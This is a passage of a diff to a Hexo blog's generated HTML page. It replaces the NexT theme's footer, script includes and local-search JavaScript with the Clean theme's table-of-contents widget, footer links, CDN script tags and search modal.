+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2" aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
 
-  
-</div>
-
-
-
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
 
     
 
-  </div>
 
-  
+    <!-- Footer -->
+    <hr>
 
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2020 
+                    <a rel="external" class="copyright-link" href="t43" target="_blank">t43M!ne</a><br>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+<script src="/js/search.js"></script>
 <script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+    $(function () {
+        searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+    });
 </script>
 
 
+<script src="/js/main.js"></script>
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
 
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url);
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
-
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
 
 </body>
 </html>
